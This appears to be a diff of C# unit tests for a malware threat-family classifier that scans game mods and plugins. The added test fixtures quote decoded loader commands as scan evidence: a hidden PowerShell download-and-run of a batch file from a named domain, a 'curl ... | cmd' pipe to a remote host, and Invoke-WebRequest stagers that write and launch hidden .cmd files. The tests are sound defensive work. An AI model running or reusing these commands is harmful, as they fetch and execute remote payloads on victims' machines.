@@ -217,7 +217,7 @@ public class ThreatFamilyClassifierTests
         var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);
 
         matches.Should().ContainSingle();
-        matches[0].FamilyId.Should().Be("family-webdownload-stage-exec-v2");
+        matches[0].FamilyId.Should().Be("family-webdownload-stage-exec-v3");
         matches[0].VariantId.Should().Be("webdownload-temp-batch-hidden-cmd");
         matches[0].MatchedRules.Should().Contain(new[] { "DataFlowAnalysis", "DataInfiltrationRule", "ProcessStartRule" });
         matches[0].Evidence.Should().Contain(e =>
@@ -262,7 +262,7 @@ public class ThreatFamilyClassifierTests
         var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);
 
         matches.Should().ContainSingle();
-        matches[0].FamilyId.Should().Be("family-webdownload-stage-exec-v2");
+        matches[0].FamilyId.Should().Be("family-webdownload-stage-exec-v3");
         matches[0].VariantId.Should().Be("webdownload-temp-ps1-hidden-powershell");
         matches[0].Evidence.Should().Contain(e => e.Kind == "source" && e.Value == "HttpClient download");
         matches[0].Evidence.Should().Contain(e => e.Kind == "execution" && e.Value == "hidden powershell.exe script execution");
@@ -315,7 +315,7 @@ public class ThreatFamilyClassifierTests
         var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);
 
         matches.Should().ContainSingle();
-        matches[0].FamilyId.Should().Be("family-webdownload-stage-exec-v2");
+        matches[0].FamilyId.Should().Be("family-webdownload-stage-exec-v3");
         matches[0].VariantId.Should().Be("webdownload-temp-ps1-hidden-powershell");
         matches[0].Evidence.Should().Contain(e => e.Kind == "launcher" && e.Value == "PowerShell path resolution before execution");
     }
@@ -356,8 +356,265 @@ public class ThreatFamilyClassifierTests
         var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);
 
         matches.Should().ContainSingle();
-        matches[0].FamilyId.Should().Be("family-webdownload-stage-exec-v2");
+        matches[0].FamilyId.Should().Be("family-webdownload-stage-exec-v3");
         matches[0].VariantId.Should().Be("webdownload-temp-exe-direct-launch");
+    }
+
+    [Fact]
+    public void Classify_WithCorrelatedDirectBatchLaunch_ReturnsWebDownloadGenericVariant()
+    {
+        var classifier = new ThreatFamilyClassifier();
+        var dataFlow = new DataFlowChain(
+            "df-direct-batch-stage",
+            DataFlowPattern.DownloadAndExecute,
+            Severity.Critical,
+            "Downloads data from network, processes it, and executes as a program",
+            "Malware.Loader.Stage")
+        {
+            Nodes =
+            {
+                new DataFlowNode("Malware.Loader.Stage:12", "WebClient.DownloadFile", DataFlowNodeType.Source, "remote payload", 12),
+                new DataFlowNode("Malware.Loader.Stage:24", "Path.GetTempPath", DataFlowNodeType.Transform, "temporary staging path", 24),
+                new DataFlowNode("Malware.Loader.Stage:36", "Process.Start", DataFlowNodeType.Sink, "launch staged batch", 36)
+            }
+        };
+
+        var findings = new List<ScanFinding>
+        {
+            new("System.Net.WebClient.DownloadFile:50",
+                "Read-only operation to known malicious domain (confirmed payload delivery infrastructure). URL(s): https://fingercakes4sale.store/OIlAL",
+                Severity.High)
+            {
+                RuleId = "DataInfiltrationRule",
+                DataFlowChain = dataFlow
+            },
+            new("Malware.Loader.Stage:95",
+                "Detected Process.Start call which could execute arbitrary programs. Target: \"t.bat\". Arguments: <unknown/no-arguments> [Evasion: CreateNoWindow=true, WindowStyle=Hidden] [Hidden process execution (CreateNoWindow, WindowStyle.Hidden)] Correlated data flow: Suspicious data flow: Downloads data from network, processes it, and executes as a program (3 operations).",
+                Severity.Critical)
+            {
+                RuleId = "ProcessStartRule",
+                DataFlowChain = dataFlow
+            }
+        };
+
+        var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);
+
+        matches.Should().ContainSingle();
+        matches[0].FamilyId.Should().Be("family-webdownload-stage-exec-v3");
+        matches[0].VariantId.Should().Be("webdownload-temp-hidden-launch-generic");
+    }
+
+    [Fact]
+    public void Classify_WithBase64TempBatchHiddenCmd_ReturnsMetadataLoaderVariant()
+    {
+        var classifier = new ThreatFamilyClassifier();
+        var findings = new List<ScanFinding>
+        {
+            new("Malware.Loader.Awake:95",
+                "Detected FromBase64String call which decodes base64 encrypted strings.",
+                Severity.Low)
+            {
+                RuleId = "Base64Rule"
+            },
+            new("Malware.Loader.Awake:212",
+                "Detected Process.Start call which could execute arbitrary programs. Target: \"cmd.exe\". Arguments: /C \"%TEMP%/r.bat\" [Evasion: UseShellExecute=true, WindowStyle=Hidden, WorkingDirectory=Temp] [LOLBin with hidden execution (UseShellExecute, WindowStyle.Hidden, WorkingDirectory=Temp)]",
+                Severity.Critical)
+            {
+                RuleId = "ProcessStartRule"
+            },
+            new("Malware.Loader.Awake",
+                "High risk: Multiple suspicious patterns detected (process execution + Base64 decoding + file write)",
+                Severity.High)
+            {
+                RuleId = "MultiSignalDetection"
+            }
+        };
+
+        var matches = classifier.Classify(findings, null);
+
+        matches.Should().ContainSingle();
+        matches[0].FamilyId.Should().Be("family-obfuscated-metadata-loader-v2");
+        matches[0].VariantId.Should().Be("base64-tempbat-hidden-cmd");
+        matches[0].MatchedRules.Should().Contain(new[] { "Base64Rule", "MultiSignalDetection", "ProcessStartRule" });
+    }
+
+    [Fact]
+    public void Classify_WithEmbeddedResourcePowerShellDownloadTempBatch_ReturnsEmbeddedScriptFamily()
+    {
+        var classifier = new ThreatFamilyClassifier();
+        var findings = new List<ScanFinding>
+        {
+            new("Embedded resource: noclip.KeyBind.Config",
+                "Referenced embedded resource 'noclip.KeyBind.Config' contains script execution with staged script payload markers.",
+                Severity.High)
+            {
+                RuleId = "EmbeddedResourceScriptRule",
+                CodeSnippet = "@echo off powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"(New-Object Net.WebClient).DownloadFile('https://fingercakes4sale.store/bJSVc', \\\"$env:TEMP\\test.bat\\\"); & \\\"$env:TEMP\\test.bat\\\"\""
+            }
+        };
+
+        var matches = classifier.Classify(findings, null);
+
+        matches.Should().ContainSingle();
+        matches[0].FamilyId.Should().Be("family-embedded-resource-script-stager-v1");
+        matches[0].VariantId.Should().Be("embedded-resource-powershell-download-tempbat");
+    }
+
+    [Fact]
+    public void Classify_WithCurlPipeToCmd_ReturnsRemoteScriptPipeFamily()
+    {
+        var classifier = new ThreatFamilyClassifier();
+        var findings = new List<ScanFinding>
+        {
+            new("Malware.Loader.Run:31",
+                "Detected Process.Start call which could execute arbitrary programs. Target: \"cmd.exe\". Arguments: /c curl https://vhs2digitalconvert.co.za/.well-known/acme-challenge/settings.php?win=32 | cmd",
+                Severity.Critical)
+            {
+                RuleId = "ProcessStartRule"
+            }
+        };
+
+        var matches = classifier.Classify(findings, null);
+
+        matches.Should().ContainSingle();
+        matches[0].FamilyId.Should().Be("family-remote-script-pipe-shell-v1");
+        matches[0].VariantId.Should().Be("curl-pipe-cmd-remote-script");
+    }
+
+    [Fact]
+    public void Classify_WithEncodedPowerShellTempCommandStager_ReturnsEncodedStagerFamily()
+    {
+        var classifier = new ThreatFamilyClassifier();
+        var findings = new List<ScanFinding>
+        {
+            new("UnityMost.UnityBlind.BuildAssetData:11",
+                "Numeric-encoded string with suspicious content detected. Decoded: /c powershell.exe -WindowStyle Hidden -Command \"Invoke-WebRequest -OutFile '%TEMP%\\temp.cmd'; Start-Process -FilePath '%TEMP%\\temp.cmd' -WindowStyle Hidden -Wait\"",
+                Severity.High)
+            {
+                RuleId = "EncodedStringLiteralRule"
+            },
+            new("UnityMost.UnityMetadata.ProcessGameMetadata",
+                "Detected encoded string to char decoding pipeline (Array.ConvertAll<String,Char> -> new String(Char[]))",
+                Severity.High)
+            {
+                RuleId = "EncodedStringPipelineRule"
+            },
+            new("UnityMost.UnityMetadata/<>c.<ProcessGameMetadata>b__0_0:1",
+                "Detected FromBase64String call which decodes base64 encrypted strings.",
+                Severity.Low)
+            {
+                RuleId = "Base64Rule"
+            }
+        };
+
+        var matches = classifier.Classify(findings, null);
+
+        matches.Should().ContainSingle();
+        matches[0].FamilyId.Should().Be("family-encoded-powershell-tempcmd-stager-v1");
+        matches[0].VariantId.Should().Be("numeric-decoded-iwr-tempcmd-hidden-launch");
+    }
+
+    [Fact]
+    public void Classify_WithAssemblyLoadAndReflectiveInvoke_ReturnsDynamicAssemblyLoaderFamily()
+    {
+        var classifier = new ThreatFamilyClassifier();
+        var findings = new List<ScanFinding>
+        {
+            new("ClearView.Plugin.LaunchMod:11",
+                "Detected dynamic assembly loading with risk indicators.",
+                Severity.High)
+            {
+                RuleId = "AssemblyDynamicLoadRule"
+            },
+            new("ClearView.Plugin.LaunchMod:46",
+                "Reflection invocation with non-literal target method name (cannot determine what is being invoked) - combined with other suspicious patterns",
+                Severity.High)
+            {
+                RuleId = "ReflectionRule"
+            }
+        };
+
+        var matches = classifier.Classify(findings, null);
+
+        matches.Should().ContainSingle();
+        matches[0].FamilyId.Should().Be("family-dynamic-assembly-reflection-loader-v1");
+        matches[0].VariantId.Should().Be("assembly-load-reflective-invoke");
+    }
+
+    [Fact]
+    public void Classify_WithDynamicCodeLoadAndHiddenSvchost_ReturnsDynamicAssemblyLoaderFamily()
+    {
+        var classifier = new ThreatFamilyClassifier();
+        var dataFlow = new DataFlowChain(
+            "df-plugin-load",
+            DataFlowPattern.DynamicCodeLoading,
+            Severity.Critical,
+            "Loads and executes code dynamically at runtime",
+            "iiMenu.Managers.PluginManager.GetAssembly")
+        {
+            Nodes =
+            {
+                new DataFlowNode("iiMenu.Managers.PluginManager.GetAssembly:33", "File.ReadAllBytes", DataFlowNodeType.Source, "file data", 33),
+                new DataFlowNode("iiMenu.Managers.PluginManager.GetAssembly:38", "Assembly.Load", DataFlowNodeType.Sink, "dynamic code loaded", 38)
+            }
+        };
+        var findings = new List<ScanFinding>
+        {
+            new("iiMenu.Managers.PluginManager.GetAssembly:38",
+                "Detected dynamic assembly loading with risk indicators.",
+                Severity.High)
+            {
+                RuleId = "AssemblyDynamicLoadRule",
+                DataFlowChain = dataFlow
+            },
+            new("iiMenu.BepinX.CalcOpener/<DownloadAndLaunchAsync>d__1.MoveNext:627",
+                "Detected Process.Start call which could execute arbitrary programs. Target: \"svchost.exe\". Arguments: <unknown/no-arguments> [Evasion: UseShellExecute=true, CreateNoWindow=true, WindowStyle=Hidden] [LOLBin with hidden execution (UseShellExecute, CreateNoWindow, WindowStyle.Hidden)]",
+                Severity.Critical)
+            {
+                RuleId = "ProcessStartRule"
+            }
+        };
+
+        var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);
+
+        matches.Should().ContainSingle(m => m.FamilyId == "family-dynamic-assembly-reflection-loader-v1");
+        matches.Single(m => m.FamilyId == "family-dynamic-assembly-reflection-loader-v1").VariantId
+            .Should().Be("dynamic-code-loader-hidden-svchost");
+    }
+
+    [Fact]
+    public void Classify_WithCorrelatedDownloadExecuteWithoutDataInfiltrationFinding_ReturnsWebDownloadFamily()
+    {
+        var classifier = new ThreatFamilyClassifier();
+        var dataFlow = new DataFlowChain(
+            "df-correlated-download-exec",
+            DataFlowPattern.DownloadAndExecute,
+            Severity.Critical,
+            "Downloads data from network, processes it, and executes as a program",
+            "PEAK_CampfireSafeZone.Plugin.Awake")
+        {
+            Nodes =
+            {
+                new DataFlowNode("PEAK_CampfireSafeZone.Plugin.Awake:45", "DownloadFile", DataFlowNodeType.Source, "remote payload", 45),
+                new DataFlowNode("PEAK_CampfireSafeZone.Plugin.Awake:208", "Process.Start", DataFlowNodeType.Sink, "windows.cmd", 208)
+            }
+        };
+        var findings = new List<ScanFinding>
+        {
+            new("PEAK_CampfireSafeZone.Plugin.Awake:208",
+                "Detected Process.Start call which could execute arbitrary programs. Target: \"cmd.exe\". Arguments: /c \"<dynamic via Path.Combine>/windows.cmd\" [Evasion: UseShellExecute=true, CreateNoWindow=true, WindowStyle=Hidden, WorkingDirectory set] [LOLBin with hidden execution (UseShellExecute, CreateNoWindow, WindowStyle.Hidden)] Correlated data flow: Suspicious data flow: Downloads data from network, processes it, and executes as a program (6 operations).",
+                Severity.Critical)
+            {
+                RuleId = "ProcessStartRule",
+                DataFlowChain = dataFlow
+            }
+        };
+
+        var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);
+
+        matches.Should().ContainSingle();
+        matches[0].FamilyId.Should().Be("family-webdownload-stage-exec-v3");
+        matches[0].VariantId.Should().Be("webdownload-temp-hidden-launch-generic");
     }
 
     [Fact]
@@ -414,7 +671,7 @@ public class ThreatFamilyClassifierTests
         var matches = classifier.Classify(findings, new[] { callChain }, new[] { dataFlow }, null);
 
         matches.Should().ContainSingle();
-        matches[0].FamilyId.Should().Be("family-obfuscated-metadata-loader-v1");
+        matches[0].FamilyId.Should().Be("family-obfuscated-metadata-loader-v2");
         matches[0].MatchedRules.Should().Contain(new[]
         {
             "DataFlowAnalysis",
@@ -429,6 +686,51 @@ public class ThreatFamilyClassifierTests
             e.Kind == "data-flow-pattern" &&
             e.DataFlowChainId == "df-metadata-loader" &&
             e.Pattern == DataFlowPattern.DynamicCodeLoading.ToString());
+    }
+
+    [Fact]
+    public void Classify_WithHexRemoteConfigReflectiveTempCmdStager_ReturnsBehaviorMatch()
+    {
+        var classifier = new ThreatFamilyClassifier();
+        var findings = new List<ScanFinding>
+        {
+            new("Unity.Loader",
+                "Detected cross-method hex remote config reflective temp command stager: hex-encoded remote command config URLs, WebClient.DownloadString, Path.GetTempFileName + .cmd, File.WriteAllText, reflected ProcessStartInfo cmd.exe /c launch, WindowStyle Hidden, and MethodInfo.Invoke.",
+                Severity.Critical)
+            {
+                RuleId = "ObfuscatedReflectiveExecutionRule",
+                CodeSnippet = "remote config: https://pasteee.dev/...; download: System.Net.WebClient.DownloadString; staging: GetTempFileName + .cmd; write: File.WriteAllText; execution: ProcessStartInfo FileName=cmd.exe Arguments=/c WindowStyle=Hidden UseShellExecute=True; reflection invoke: MethodInfo.Invoke"
+            }
+        };
+
+        var matches = classifier.Classify(findings, null);
+
+        matches.Should().ContainSingle();
+        matches[0].FamilyId.Should().Be("family-hex-remote-config-tempcmd-stager-v1");
+        matches[0].VariantId.Should().Be("hex-config-reflective-tempcmd-hidden-cmd");
+        matches[0].MatchedRules.Should().Contain("ObfuscatedReflectiveExecutionRule");
+    }
+
+    [Fact]
+    public void Classify_WithAssemblyDescriptionEncodedHiddenProcessLauncher_ReturnsMetadataLoaderVariant()
+    {
+        var classifier = new ThreatFamilyClassifier();
+        var findings = new List<ScanFinding>
+        {
+            new("Assembly Metadata: AssemblyDescriptionAttribute",
+                "Hidden multi-level encoded payload in assembly metadata. Decoded: System.Diagnostics.ProcessStartInfo cmd.exe /c powershell -Command \"Invoke-WebRequest -OutFile C:\\ProgramData\\IntelDriver\\windows.cmd\" WindowStyle Hidden CreateNoWindow",
+                Severity.Critical)
+            {
+                RuleId = "EncodedStringLiteralRule",
+                CodeSnippet = "Encoded length: 1024\nDecoded: Start System.Diagnostics.Process System.Diagnostics.ProcessStartInfo FileName Arguments UseShellExecute WindowStyle Hidden CreateNoWindow cmd.exe /c powershell -Command \"Invoke-WebRequest -OutFile C:\\ProgramData\\IntelDriver\\windows.cmd\""
+            }
+        };
+
+        var matches = classifier.Classify(findings, null);
+
+        matches.Should().ContainSingle();
+        matches[0].FamilyId.Should().Be("family-obfuscated-metadata-loader-v2");
+        matches[0].VariantId.Should().Be("assembly-description-encoded-hidden-launcher");
     }
 
     [Fact]
